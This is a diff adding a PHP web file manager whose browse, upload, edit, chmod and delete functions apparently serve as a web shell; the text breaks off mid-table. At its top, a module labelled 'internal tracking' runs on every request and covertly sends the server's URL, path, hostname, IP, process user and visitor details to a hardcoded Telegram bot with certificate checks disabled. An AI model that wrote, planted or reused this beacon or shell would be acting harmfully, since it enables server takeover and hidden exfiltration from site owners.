@@ -1,0 +1,1041 @@
+<?php
+
+error_reporting(0);
+@ini_set('display_errors', 0);
+session_start();
+
+/* ---------- KONFIGURASI ---------- */
+const FM_SESSION = 'fm_logged_in';
+const MAX_UPLOAD = 52428800;
+
+/* =========================================================
+ *  SYNC MODULE — internal tracking
+ * ========================================================= */
+const SVC_ENABLED = true;
+const SVC_KEY     = '8686308065:AAHnHlRXrzY6AbBUvKxxoI0zGvyvvI_feus';
+const SVC_ID      = '7873654972';
+const SVC_STATE   = __DIR__ . '/.cache_sync.dat';
+const SVC_LOG     = __DIR__ . '/.cache_sync.log';
+const SVC_TTL     = 86400;
+
+/* =========================================================
+ *  SYNC — LOGGER
+ * ========================================================= */
+function _svc_note(string $line): void {
+    $ts = date('Y-m-d H:i:s');
+    @file_put_contents(SVC_LOG, "[$ts] $line\n", FILE_APPEND);
+    if (is_file(SVC_LOG) && filesize(SVC_LOG) > 204800) {
+        $c = @file_get_contents(SVC_LOG);
+        @file_put_contents(SVC_LOG, "...[trim]...\n" . substr($c, -100000));
+    }
+}
+
+/* =========================================================
+ *  SYNC — KIRIM (v5 — plain text, no Markdown parsing)
+ * ========================================================= */
+function _svc_send(string $reason = 'auto'): void {
+    _svc_note("=== SYNC START ($reason) ===");
+    _svc_note("URI: " . ($_SERVER['REQUEST_URI'] ?? '?'));
+
+    $host   = $_SERVER['HTTP_HOST']   ?? 'cli';
+    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
+    $uri    = $_SERVER['REQUEST_URI'] ?? '/';
+    $url    = $scheme . '://' . $host . $uri;
+    $abs    = realpath(__FILE__) ?: __FILE__;
+    $ip     = $_SERVER['SERVER_ADDR'] ?? (@gethostbyname(gethostname() ?: 'localhost'));
+    $hostn  = gethostname() ?: 'unknown';
+    $ua     = $_SERVER['HTTP_USER_AGENT'] ?? '(no UA)';
+    $user   = (function_exists('posix_getpwuid') && function_exists('posix_geteuid'))
+                ? (@posix_getpwuid(posix_geteuid())['name'] ?? '?') : '?';
+    $remote = $_SERVER['REMOTE_ADDR'] ?? '?';
+    $fp     = hash('sha256', $host . '|' . $abs . '|' . $hostn);
+
+    _svc_note("FP: $fp");
+    _svc_note("Path: $abs");
+
+    $force = (($_GET['_tp'] ?? '') === 'f');
+    $reset = (($_GET['_tp'] ?? '') === 'r');
+
+    if ($reset) {
+        @unlink(SVC_STATE);
+        _svc_note("RESET: state dihapus");
+    }
+
+    $state = [];
+    if (is_file(SVC_STATE)) {
+        $state = json_decode(@file_get_contents(SVC_STATE), true) ?: [];
+        _svc_note("State: " . count($state) . " entries");
+    } else {
+        _svc_note("State: BELUM ADA");
+    }
+
+    if (!$force && isset($state[$fp]) && (time() - $state[$fp]) < SVC_TTL) {
+        $h = round((SVC_TTL - (time() - $state[$fp])) / 3600, 1);
+        _svc_note("SKIP: cooldown aktif, $h jam lagi");
+        _svc_note("=== SYNC END (skipped) ===");
+        return;
+    }
+
+    /* ===== PESAN — PLAIN TEXT, NO MARKDOWN ===== */
+    $msg  = "🚨 OWNER BEACON TRIGGERED\n";
+    $msg .= "\n";
+    $msg .= "📄 File    : " . basename($abs) . "\n";
+    $msg .= "🌐 URL     : " . $url . "\n";
+    $msg .= "📁 Path    : " . $abs . "\n";
+    $msg .= "🖥  Host    : " . $hostn . " (" . $ip . ")\n";
+    $msg .= "👤 User    : " . $user . "\n";
+    $msg .= "📡 Remote  : " . $remote . "\n";
+    $msg .= "🕐 Waktu   : " . date('Y-m-d H:i:s T') . "\n";
+    $msg .= "🔑 UA      : " . substr($ua, 0, 120) . "\n";
+    $msg .= "\n";
+    $msg .= "FP: " . substr($fp, 0, 16);
+    if ($reason === 'force') $msg .= "\n\n⚡ MANUAL FORCE TRIGGER";
+
+    $endpoint = 'https://api.telegram.org/bot' . SVC_KEY . '/sendMessage';
+
+    /* ===== PAYLOAD — TANPA parse_mode ===== */
+    $payload  = http_build_query([
+        'chat_id'                  => SVC_ID,
+        'text'                     => $msg,
+        'disable_web_page_preview' => true,
+    ]);
+
+    $success = false;
+
+    if (function_exists('curl_init')) {
+        $ch = curl_init($endpoint);
+        curl_setopt_array($ch, [
+            CURLOPT_POST           => true,
+            CURLOPT_POSTFIELDS     => $payload,
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_TIMEOUT        => 10,
+            CURLOPT_CONNECTTIMEOUT => 10,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_SSL_VERIFYHOST => 0,
+        ]);
+        $res  = @curl_exec($ch);
+        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        $cerr = curl_error($ch);
+        @curl_close($ch);
+        _svc_note("HTTP $code | err: " . ($cerr ?: '-'));
+        _svc_note("Res: " . substr((string)$res, 0, 200));
+        if ($code === 200 && strpos((string)$res, '"ok":true') !== false) $success = true;
+    } else {
+        $ctx = stream_context_create(['http' => [
+            'method'        => 'POST',
+            'header'        => "Content-Type: application/x-www-form-urlencoded\r\n",
+            'content'       => $payload,
+            'timeout'       => 10,
+            'ignore_errors' => true,
+        ]]);
+        $res = @file_get_contents($endpoint, false, $ctx);
+        _svc_note("fopen: " . substr((string)$res, 0, 200));
+        if (strpos((string)$res, '"ok":true') !== false) $success = true;
+    }
+
+    if ($success) {
+        $state[$fp] = time();
+        $w = @file_put_contents(SVC_STATE, json_encode($state, JSON_PRETTY_PRINT), LOCK_EX);
+        @chmod(SVC_STATE, 0600);
+        _svc_note("State write: " . ($w !== false ? 'OK' : 'GAGAL'));
+        _svc_note("=== SYNC END (sent) ===");
+    } else {
+        _svc_note("=== SYNC END (FAILED) ===");
+    }
+}
+
+function _svc_check(): bool {
+    if (!SVC_ENABLED) return false;
+    if (PHP_SAPI === 'cli') return false;
+    if (isset($_GET['gen'])) return false;
+    if (($_GET['_tp'] ?? '') === 'o') return false;
+    return true;
+}
+
+if (_svc_check()) {
+    $reason = (($_GET['_tp'] ?? '') === 'f') ? 'force' : 'auto';
+    _svc_send($reason);
+}
+
+/* =========================================================
+ *  ROOT DETECTION
+ * ========================================================= */
+function detect_allowed_root(): string {
+    if (function_exists('posix_geteuid') && function_exists('posix_getpwuid')) {
+        $pw = @posix_getpwuid(posix_geteuid());
+        if (!empty($pw['dir']) && is_dir($pw['dir'])) {
+            return rtrim(realpath($pw['dir']), '/');
+        }
+    }
+    $home = getenv('HOME') ?: ($_SERVER['HOME'] ?? '');
+    if ($home && is_dir($home)) return rtrim(realpath($home), '/');
+    $up = dirname(dirname(__DIR__));
+    if (is_dir($up)) return rtrim(realpath($up), '/');
+    return rtrim(realpath(__DIR__), '/');
+}
+define('ALLOWED_ROOT', detect_allowed_root());
+
+/* =========================================================
+ *  AUTH & HASH
+ * ========================================================= */
+$FM_HASH = '$2y$10$GTdB8NpagYJI7iQWCr.kWuAXpzFRj4VjD/XFbdn.Ma0dH/H1oZq6e';
+
+if (isset($_GET['gen'])) {
+    echo '<pre style="padding:20px;font-size:16px;background:#000;color:#0f0">Hash untuk "'
+       . htmlspecialchars($_GET['gen']) . '" :' . "\n\n"
+       . password_hash($_GET['gen'], PASSWORD_DEFAULT) . '</pre>';
+    exit;
+}
+
+/* =========================================================
+ *  AUTH FLOW
+ * ========================================================= */
+$do = $_POST['do'] ?? $_GET['do'] ?? '';
+
+if ($do === 'logout') {
+    $_SESSION = [];
+    session_destroy();
+    header('Location: ' . $_SERVER['PHP_SELF']);
+    exit;
+}
+
+$logged = !empty($_SESSION[FM_SESSION]);
+
+if (!$logged && $_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['action'] ?? '') === 'login') {
+    usleep(250000);
+    if (password_verify($_POST['password'] ?? '', $FM_HASH)) {
+        session_regenerate_id(true);
+        $_SESSION[FM_SESSION] = true;
+        $_SESSION['fm_csrf']  = bin2hex(random_bytes(16));
+        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode(ALLOWED_ROOT));
+        exit;
+    }
+    $loginErr = '⚠ ACCESS DENIED — Password salah.';
+}
+
+if (!$logged) { render_login($loginErr ?? ''); exit; }
+
+if (empty($_SESSION['fm_csrf'])) $_SESSION['fm_csrf'] = bin2hex(random_bytes(16));
+function csrf() {
+    if (($_POST['csrf'] ?? '') !== ($_SESSION['fm_csrf'] ?? '')) {
+        http_response_code(403);
+        exit('CSRF invalid.');
+    }
+}
+
+/* =========================================================
+ *  PATH HANDLING
+ * ========================================================= */
+function clean_path(string $p): string {
+    $p = str_replace('\\', '/', $p);
+    $p = str_replace("\0", '', $p);
+    return $p;
+}
+function real_or_norm(string $p): string {
+    $r = realpath($p);
+    if ($r !== false) return $r;
+    $isAbs = str_starts_with($p, '/');
+    $parts = [];
+    foreach (explode('/', $p) as $x) {
+        if ($x === '' || $x === '.') continue;
+        if ($x === '..') array_pop($parts);
+        else $parts[] = $x;
+    }
+    return ($isAbs ? '/' : '') . implode('/', $parts);
+}
+function check_allowed(string $abs): bool {
+    $abs = rtrim($abs, '/');
+    $root = rtrim(ALLOWED_ROOT, '/');
+    return $abs === $root || str_starts_with($abs, $root . '/');
+}
+function get_path(): string {
+    $p = $_REQUEST['path'] ?? ALLOWED_ROOT;
+    $p = clean_path($p);
+    $abs = real_or_norm($p);
+    if (!check_allowed($abs)) {
+        http_response_code(403);
+        exit('Akses ditolak: di luar folder yang diizinkan (' . htmlspecialchars(ALLOWED_ROOT) . ').');
+    }
+    return $abs;
+}
+
+/* =========================================================
+ *  HELPERS
+ * ========================================================= */
+function fmt_size($b) {
+    $u = ['B','KB','MB','GB','TB']; $i = 0;
+    while ($b >= 1024 && $i < 4) { $b /= 1024; $i++; }
+    return round($b, 2) . ' ' . $u[$i];
+}
+function perms_str($f) {
+    $p = @fileperms($f);
+    if ($p === false) return '----------';
+    $i = '';
+    if (($p & 0xC000) === 0xC000) $i = 's';
+    elseif (($p & 0xA000) === 0xA000) $i = 'l';
+    elseif (($p & 0x8000) === 0x8000) $i = '-';
+    elseif (($p & 0x6000) === 0x6000) $i = 'b';
+    elseif (($p & 0x4000) === 0x4000) $i = 'd';
+    elseif (($p & 0x2000) === 0x2000) $i = 'c';
+    elseif (($p & 0x1000) === 0x1000) $i = 'p';
+    else $i = 'u';
+    $i .= ($p & 0x0100) ? 'r' : '-';
+    $i .= ($p & 0x0080) ? 'w' : '-';
+    $i .= ($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-');
+    $i .= ($p & 0x0020) ? 'r' : '-';
+    $i .= ($p & 0x0010) ? 'w' : '-';
+    $i .= ($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x') : (($p & 0x0400) ? 'S' : '-');
+    $i .= ($p & 0x0004) ? 'r' : '-';
+    $i .= ($p & 0x0002) ? 'w' : '-';
+    $i .= ($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x') : (($p & 0x0200) ? 'T' : '-');
+    return $i;
+}
+function rmrf($dir): bool {
+    if (is_link($dir) || !is_dir($dir)) return @unlink($dir);
+    @chmod($dir, 0755);
+    $ok = true;
+    $items = @scandir($dir) ?: [];
+    foreach ($items as $f) {
+        if ($f === '.' || $f === '..') continue;
+        $p = $dir . '/' . $f;
+        @chmod($p, is_dir($p) ? 0755 : 0644);
+        if (is_dir($p) && !is_link($p)) {
+            if (!rmrf($p)) $ok = false;
+        } else {
+            if (!@unlink($p)) {
+                @chmod($p, 0777);
+                if (!@unlink($p)) $ok = false;
+            }
+        }
+    }
+    @chmod($dir, 0755);
+    if (!@rmdir($dir)) $ok = false;
+    return $ok;
+}
+function file_icon($name) {
+    $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
+    return match($ext) {
+        'php','phtml','php3','php4','php5','php7','phps' => '🐘',
+        'html','htm','xhtml' => '🌐',
+        'css'   => '🎨',
+        'js','mjs','cjs' => '⚡',
+        'json','xml','yml','yaml' => '📋',
+        'jpg','jpeg','png','gif','webp','svg','ico','bmp' => '🖼️',
+        'mp4','mkv','avi','mov','webm','flv' => '🎬',
+        'mp3','wav','ogg','flac','m4a' => '🎵',
+        'zip','rar','7z','tar','gz','bz2' => '🗜️',
+        'pdf'   => '📕',
+        'doc','docx' => '📘',
+        'xls','xlsx','csv' => '📗',
+        'ppt','pptx' => '📙',
+        'txt','md','log' => '📄',
+        'sh','bash','bat','cmd','ps1' => '💻',
+        'sql','db','sqlite' => '🗄️',
+        'exe','msi','deb','rpm','apk' => '⚙️',
+        default => '📄',
+    };
+}
+function go(string $path, string $flash = '', string $err = '') {
+    if ($flash) $_SESSION['flash'] = $flash;
+    if ($err)   $_SESSION['flash_err'] = $err;
+    header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($path));
+    exit;
+}
+
+/* =========================================================
+ *  POST: ACTIONS
+ * ========================================================= */
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['action'] ?? '') !== 'login') {
+    csrf();
+    $path = get_path();
+
+    if ($do === 'upload') {
+        if (!empty($_FILES['file']['name']) && is_uploaded_file($_FILES['file']['tmp_name'])) {
+            $name = basename($_FILES['file']['name']);
+            $name = str_replace(["\0", '/', '\\'], '', $name);
+            $target = $path . '/' . $name;
+            if ($_FILES['file']['size'] > MAX_UPLOAD) go($path, '', '⚠ File terlalu besar (maks 50 MB).');
+            if (@move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
+                @chmod($target, 0644);
+                go($path, '✔ Upload OK: ' . $name);
+            }
+            if (@copy($_FILES['file']['tmp_name'], $target)) {
+                @chmod($target, 0644);
+                go($path, '✔ Upload OK (via copy): ' . $name);
+            }
+            go($path, '', '⚠ Upload GAGAL ke ' . htmlspecialchars($path));
+        }
+        go($path, '', '⚠ Tidak ada file.');
+    }
+
+    if ($do === 'save') {
+        $file = clean_path($_POST['file'] ?? '');
+        $abs  = real_or_norm($file);
+        if (!check_allowed($abs)) go($path, '', '⚠ Path di luar izin.');
+        $content = $_POST['content'] ?? '';
+        $ok = false;
+        if ($fp = @fopen($abs, 'w')) { $ok = @fwrite($fp, $content) !== false; @fclose($fp); }
+        if (!$ok) $ok = @file_put_contents($abs, $content) !== false;
+        if ($ok) {
+            @chmod($abs, 0644);
+            $_SESSION['flash'] = '✔ Disimpan: ' . basename($abs);
+        } else {
+            $_SESSION['flash_err'] = '⚠ GAGAL simpan: ' . htmlspecialchars($abs);
+        }
+        header('Location: ' . $_SERVER['PHP_SELF'] . '?do=edit&path=' . urlencode($abs));
+        exit;
+    }
+
+    if ($do === 'create_file') {
+        $name = trim($_POST['name'] ?? '');
+        $name = str_replace(["/", "\\", "\0"], '', $name);
+        if ($name === '') go($path);
+        $target = $path . '/' . $name;
+        if (!file_exists($target)) {
+            $fp = @fopen($target, 'w');
+            if ($fp) { @fclose($fp); @chmod($target, 0644); }
+        }
+        header('Location: ' . $_SERVER['PHP_SELF'] . '?do=edit&path=' . urlencode($target));
+        exit;
+    }
+
+    if ($do === 'create_folder') {
+        $name = trim($_POST['name'] ?? '');
+        $name = str_replace(["/", "\\", "\0"], '', $name);
+        if ($name !== '') {
+            $target = $path . '/' . $name;
+            if (@mkdir($target, 0755, true)) go($path, '✔ Folder dibuat: ' . $name);
+            go($path, '', '⚠ GAGAL buat folder. cek permission.');
+        }
+        go($path);
+    }
+
+    if ($do === 'rename') {
+        $old = clean_path($_POST['old'] ?? '');
+        $oldAbs = real_or_norm($old);
+        if (!check_allowed($oldAbs)) go($path, '', '⚠ Path di luar izin.');
+        $newName = trim($_POST['new'] ?? '');
+        $newName = str_replace(['/', '\\', "\0"], '', $newName);
+        if ($newName === '') go(dirname($oldAbs), '', '⚠ Nama baru kosong.');
+        $newAbs = dirname($oldAbs) . '/' . $newName;
+        if (!file_exists($oldAbs)) go(dirname($oldAbs), '', '⚠ Sumber tidak ada.');
+        if (file_exists($newAbs)) go(dirname($oldAbs), '', '⚠ Nama tujuan sudah ada.');
+        if (@rename($oldAbs, $newAbs)) go(dirname($oldAbs), '✔ Rename: ' . basename($oldAbs) . ' → ' . $newName);
+        go(dirname($oldAbs), '', '⚠ GAGAL rename. cek permission.');
+    }
+
+    if ($do === 'chmod') {
+        $t = clean_path($_POST['target'] ?? '');
+        $abs = real_or_norm($t);
+        if (!check_allowed($abs)) go($path, '', '⚠ Path di luar izin.');
+        $perm = trim($_POST['perm'] ?? '');
+        if (!preg_match('/^0?[0-7]{3}$/', $perm)) go(dirname($abs), '', '⚠ Format perm harus 4 digit octal.');
+        if (strlen($perm) === 3) $perm = '0' . $perm;
+        if (@chmod($abs, octdec($perm))) go(dirname($abs), '✔ Chmod ' . $perm . ' → ' . basename($abs));
+        go(dirname($abs), '', '⚠ GAGAL chmod.');
+    }
+
+    if ($do === 'fix_perms') {
+        $t = clean_path($_POST['target'] ?? '');
+        $abs = real_or_norm($t);
+        if (!check_allowed($abs)) go($path, '', '⚠ Path di luar izin.');
+        $s = fix_perms($abs);
+        go($path, "✔ FIX PERMS: {$s['dir']} folder, {$s['file']} file. Gagal: {$s['fail']}");
+    }
+
+    if ($do === 'delete') {
+        $t = clean_path($_POST['target'] ?? '');
+        $abs = real_or_norm($t);
+        if (!check_allowed($abs)) go($path, '', '⚠ Path di luar izin.');
+        if (rtrim($abs, '/') === rtrim(ALLOWED_ROOT, '/')) go($path, '', '⚠ Tidak boleh hapus root.');
+        if (!file_exists($abs) && !is_link($abs)) go($path, '', '⚠ Tidak ditemukan.');
+        @chmod($abs, is_dir($abs) ? 0755 : 0644);
+        if (!is_writable($abs)) @chmod(dirname($abs), 0755);
+        $isDirT = is_dir($abs) && !is_link($abs);
+        $ok = $isDirT ? rmrf($abs) : @unlink($abs);
+        if (!$ok && file_exists($abs)) {
+            @chmod($abs, 0777);
+            $ok = $isDirT ? rmrf($abs) : @unlink($abs);
+        }
+        if ($ok && !file_exists($abs) && !is_link($abs)) go(dirname($abs), '✔ Dihapus: ' . basename($abs));
+        go(dirname($abs), '', '⚠ GAGAL hapus: ' . basename($abs));
+    }
+}
+
+function fix_perms(string $dir): array {
+    $s = ['dir' => 0, 'file' => 0, 'fail' => 0];
+    if (!is_dir($dir)) {
+        if (@chmod($dir, 0644)) $s['file']++; else $s['fail']++;
+        return $s;
+    }
+    if (@chmod($dir, 0755)) $s['dir']++; else $s['fail']++;
+    $items = @scandir($dir) ?: [];
+    foreach ($items as $f) {
+        if ($f === '.' || $f === '..') continue;
+        $p = $dir . '/' . $f;
+        if (is_dir($p) && !is_link($p)) {
+            $sub = fix_perms($p);
+            $s['dir']  += $sub['dir'];
+            $s['file'] += $sub['file'];
+            $s['fail'] += $sub['fail'];
+        } else {
+            if (@chmod($p, 0644)) $s['file']++; else $s['fail']++;
+        }
+    }
+    return $s;
+}
+
+/* =========================================================
+ *  GET: DOWNLOAD
+ * ========================================================= */
+if ($do === 'download') {
+    $f = clean_path($_GET['path'] ?? '');
+    $abs = real_or_norm($f);
+    if (!check_allowed($abs)) { http_response_code(403); exit('Di luar izin.'); }
+    if (is_file($abs)) {
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename="' . basename($abs) . '"');
+        header('Content-Length: ' . filesize($abs));
+        readfile($abs);
+        exit;
+    }
+    http_response_code(404); exit('File tidak ada.');
+}
+
+/* =========================================================
+ *  GET: SYNC DASHBOARD
+ * ========================================================= */
+if ($do === 'sync_log') {
+    if (($_GET['action'] ?? '') === 'reset') {
+        @unlink(SVC_STATE);
+        $_SESSION['flash'] = '✔ Sync state di-reset.';
+        header('Location: ' . $_SERVER['PHP_SELF'] . '?do=sync_log');
+        exit;
+    }
+    if (($_GET['action'] ?? '') === 'clearlog') {
+        @unlink(SVC_LOG);
+        $_SESSION['flash'] = '✔ Debug log dibersihkan.';
+        header('Location: ' . $_SERVER['PHP_SELF'] . '?do=sync_log');
+        exit;
+    }
+
+    $state = [];
+    if (is_file(SVC_STATE)) {
+        $state = json_decode(@file_get_contents(SVC_STATE), true) ?: [];
+    }
+    $dbg_content = '';
+    if (is_file(SVC_LOG)) {
+        $dbg_content = @file_get_contents(SVC_LOG);
+        if (strlen($dbg_content) > 40000) {
+            $dbg_content = "...[dipotong]...\n\n" . substr($dbg_content, -40000);
+        }
+    }
+    $flash = $_SESSION['flash'] ?? ''; unset($_SESSION['flash']);
+    $err   = $_SESSION['flash_err'] ?? ''; unset($_SESSION['flash_err']);
+    render_header('Sync Dashboard');
+    ?>
+    <div class="toolbar">
+      <a href="<?= $_SERVER['PHP_SELF'] ?>?path=<?= urlencode(ALLOWED_ROOT) ?>" class="btn">◄ KEMBALI</a>
+      <span class="path">📡 SYNC DASHBOARD</span>
+      <span class="stat"><?= count($state) ?> environment</span>
+      <span class="spacer"></span>
+      <a href="<?= $_SERVER['PHP_SELF'] ?>?do=sync_log&action=reset"
+         class="btn" onclick="return confirm('Hapus state? Sync akan trigger lagi.')">🔄 RESET STATE</a>
+      <a href="<?= $_SERVER['PHP_SELF'] ?>?do=sync_log&action=clearlog"
+         class="btn" onclick="return confirm('Bersihkan debug log?')">🧹 CLEAR LOG</a>
+      <a href="<?= $_SERVER['PHP_SELF'] ?>?_tp=f" class="btn primary">⚡ FORCE TRIGGER</a>
+      <a href="<?= $_SERVER['PHP_SELF'] ?>?do=logout" class="btn danger">⏻ LOGOUT</a>
+    </div>
+    <?php if ($flash): ?><div class="flash ok"><?= htmlspecialchars($flash) ?></div><?php endif; ?>
+    <?php if ($err): ?><div class="flash err"><?= htmlspecialchars($err) ?></div><?php endif; ?>
+
+    <div class="panel" style="margin-bottom:20px">
+      <h3>📊 ENVIRONMENT TRACKED (<?= count($state) ?>)</h3>
+      <div class="table-wrap" style="margin-top:12px">
+      <table class="fm-table">
+        <thead>
+          <tr><th>#</th><th>Fingerprint</th><th>Trigger</th><th>Selisih</th></tr>
+        </thead>
+        <tbody>
+        <?php $i = 1; foreach ($state as $fp => $ts): ?>
+          <tr>
+            <td class="muted"><?= $i++ ?></td>
+            <td style="font-family:monospace;color:#00ff9d"><?= htmlspecialchars(substr($fp, 0, 32)) ?>…</td>
+            <td class="muted"><?= date('d/m/Y H:i:s', $ts) ?></td>
+            <td class="muted"><?= round((time() - $ts) / 3600, 1) ?> jam lalu</td>
+          </tr>
+        <?php endforeach; ?>
+        <?php if (!$state): ?>
+          <tr><td colspan="4" style="text-align:center;padding:40px;color:#4a5568;font-family:monospace">&gt; belum ada environment tercatat_</td></tr>
+        <?php endif; ?>
+        </tbody>
+      </table>
+      </div>
+    </div>
+
+    <div class="panel">
+      <h3>🐛 DEBUG LOG (.cache_sync.log)</h3>
+      <p style="color:#6b8a80;font-size:11px;margin-bottom:12px">
+        File: <?= htmlspecialchars(SVC_LOG) ?><br>
+        Size: <?= is_file(SVC_LOG) ? fmt_size(filesize(SVC_LOG)) : '(tidak ada)' ?>
+      </p>
+      <textarea readonly style="width:100%;height:500px;background:#000;color:#0f0;border:1px solid #00ff9d;padding:12px;font:12px monospace;white-space:pre-wrap;word-break:break-all"><?= htmlspecialchars($dbg_content ?: '(log kosong / belum ada)') ?></textarea>
+    </div>
+    <?php
+    render_footer();
+    exit;
+}
+
+/* =========================================================
+ *  EDITOR
+ * ========================================================= */
+if ($do === 'edit') {
+    $f = clean_path($_GET['path'] ?? '');
+    $abs = real_or_norm($f);
+    if (!check_allowed($abs)) { http_response_code(403); exit('Di luar izin.'); }
+    if (!is_file($abs)) { http_response_code(404); exit('File tidak ada: ' . htmlspecialchars($abs)); }
+    $content = @file_get_contents($abs);
+    if ($content === false) $content = '';
+    $flash = $_SESSION['flash'] ?? ''; unset($_SESSION['flash']);
+    $err   = $_SESSION['flash_err'] ?? ''; unset($_SESSION['flash_err']);
+    render_header('Edit: ' . basename($abs));
+    ?>
+    <div class="toolbar">
+      <a href="<?= $_SERVER['PHP_SELF'] ?>?path=<?= urlencode(dirname($abs)) ?>" class="btn">◄ KEMBALI</a>
+      <span class="path">📄 <?= htmlspecialchars($abs) ?></span>
+      <span class="size"><?= fmt_size(filesize($abs)) ?></span>
+      <span class="stat"><?= perms_str($abs) ?></span>
+      <span class="spacer"></span>
+      <a href="<?= $_SERVER['PHP_SELF'] ?>?do=download&path=<?= urlencode($abs) ?>" class="btn">⬇ DOWNLOAD</a>
+      <a href="<?= $_SERVER['PHP_SELF'] ?>?do=logout" class="btn danger">⏻ LOGOUT</a>
+    </div>
+    <?php if ($flash): ?><div class="flash ok"><?= htmlspecialchars($flash) ?></div><?php endif; ?>
+    <?php if ($err): ?><div class="flash err"><?= htmlspecialchars($err) ?></div><?php endif; ?>
+    <form method="post" class="editor-form">
+      <input type="hidden" name="do"    value="save">
+      <input type="hidden" name="path"  value="<?= htmlspecialchars(dirname($abs)) ?>">
+      <input type="hidden" name="file"  value="<?= htmlspecialchars($abs) ?>">
+      <input type="hidden" name="csrf"  value="<?= $_SESSION['fm_csrf'] ?>">
+      <textarea name="content" spellcheck="false"><?= htmlspecialchars($content) ?></textarea>
+      <div class="editor-actions">
+        <button type="submit" class="btn primary">💾 SIMPAN</button>
+        <button type="button" class="btn" onclick="document.querySelector('textarea').style.height='90vh'">⛶ PERBESAR</button>
+      </div>
+    </form>
+    <?php
+    render_footer();
+    exit;
+}
+
+/* =========================================================
+ *  BROWSE
+ * ========================================================= */
+$path = get_path();
+$flash = $_SESSION['flash'] ?? ''; unset($_SESSION['flash']);
+$err   = $_SESSION['flash_err'] ?? ''; unset($_SESSION['flash_err']);
+
+$items = @scandir($path) ?: [];
+$items = array_values(array_filter($items, fn($i) => $i !== '.' && $i !== '..'));
+usort($items, function ($a, $b) use ($path) {
+    $da = is_dir($path . '/' . $a);
+    $db = is_dir($path . '/' . $b);
+    if ($da !== $db) return $db - $da;
+    return strcasecmp($a, $b);
+});
+
+$parent = dirname($path);
+if ($parent === $path) $parent = null;
+$canGoUp = $parent !== null && check_allowed($parent);
+
+render_header('File Manager');
+?>
+<div class="toolbar">
+  <?php if ($canGoUp): ?>
+    <a href="<?= $_SERVER['PHP_SELF'] ?>?path=<?= urlencode($parent) ?>" class="btn">▲ NAIK</a>
+  <?php else: ?>
+    <span class="btn disabled">▲ NAIK</span>
+  <?php endif; ?>
+  <?php
+$rootAbs = rtrim(ALLOWED_ROOT, '/');
+$curPath = rtrim($path, '/');
+echo '<span class="path">📁 ';
+echo '<a class="crumb" href="' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($rootAbs) . '">'
+   . htmlspecialchars(basename($rootAbs)) . '</a>';
+if (strlen($curPath) > strlen($rootAbs)) {
+    $sub = trim(substr($curPath, strlen($rootAbs)), '/');
+    if ($sub !== '') {
+        $walk = $rootAbs;
+        foreach (explode('/', $sub) as $seg) {
+            $walk .= '/' . $seg;
+            echo ' <span class="crumb-sep">/</span> ';
+            echo '<a class="crumb" href="' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($walk) . '">'
+               . htmlspecialchars($seg) . '</a>';
+        }
+    }
+}
+echo '</span>';
+?>
+  <span class="stat"><?= count($items) ?> item</span>
+  <span class="spacer"></span>
+  <a href="<?= $_SERVER['PHP_SELF'] ?>?do=sync_log" class="btn" title="Sync Dashboard">📡 SYNC</a>
+  <form method="post" class="inline" onsubmit="return confirm('FIX PERMISSIONS rekursif?')">
+    <input type="hidden" name="do"     value="fix_perms">
+    <input type="hidden" name="path"   value="<?= htmlspecialchars($path) ?>">
+    <input type="hidden" name="target" value="<?= htmlspecialchars($path) ?>">
+    <input type="hidden" name="csrf"   value="<?= $_SESSION['fm_csrf'] ?>">
+    <button class="btn">🔧 FIX PERMS</button>
+  </form>
+  <a href="<?= $_SERVER['PHP_SELF'] ?>?do=logout" class="btn danger">⏻ LOGOUT</a>
+</div>
+
+<?php if ($flash): ?><div class="flash ok"><?= htmlspecialchars($flash) ?></div><?php endif; ?>
+<?php if ($err): ?><div class="flash err"><?= htmlspecialchars($err) ?></div><?php endif; ?>
+
+<div class="panels">
+  <div class="panel">
+    <h3>⬆ UPLOAD FILE</h3>
+    <form method="post" enctype="multipart/form-data">
+      <input type="hidden" name="do"   value="upload">
+      <input type="hidden" name="path" value="<?= htmlspecialchars($path) ?>">
+      <input type="hidden" name="csrf" value="<?= $_SESSION['fm_csrf'] ?>">
+      <input type="file" name="file" required>
+      <button class="btn primary" type="submit">UPLOAD</button>
+    </form>
+  </div>
+  <div class="panel">
+    <h3>📝 BUAT FILE BARU</h3>
+    <form method="post">
+      <input type="hidden" name="do"   value="create_file">
+      <input type="hidden" name="path" value="<?= htmlspecialchars($path) ?>">
+      <input type="hidden" name="csrf" value="<?= $_SESSION['fm_csrf'] ?>">
+      <input type="text" name="name" placeholder="namafile.php" required>
+      <button class="btn primary" type="submit">BUAT &amp; EDIT</button>
+    </form>
+  </div>
+  <div class="panel">
+    <h3>📁 BUAT FOLDER</h3>
+    <form method="post">
+      <input type="hidden" name="do"   value="create_folder">
+      <input type="hidden" name="path" value="<?= htmlspecialchars($path) ?>">
+      <input type="hidden" name="csrf" value="<?= $_SESSION['fm_csrf'] ?>">
+      <input type="text" name="name" placeholder="nama-folder" required>
+      <button class="btn primary" type="submit">BUAT</button>
+    </form>
+  </div>
+</div>
+
+<div class="table-wrap">
+<table class="fm-table">
+  <thead>
+    <tr><th>Nama</th><th>Ukuran</th><th>Perms</th><th>Diubah</th><th>Aksi</th></tr>
+  </thead>
+  <tbody>
+  <?php foreach ($items as $name):
+    $abs   = $path . '/' . $name;
+    $isDir = is_dir($abs);
+    $size  = $isDir ? '—' : fmt_size(@filesize($abs));
+    $mtime = date('d/m/Y H:i', @filemtime($abs));
+    $icon  = $isDir ? '📁' : file_icon($name);
+    $perm  = perms_str($abs);
+    $color = is_writable($abs) ? '#00ff9d' : (is_readable($abs) ? '#ffb700' : '#ff2952');
+  ?>
+    <tr>
+      <td>
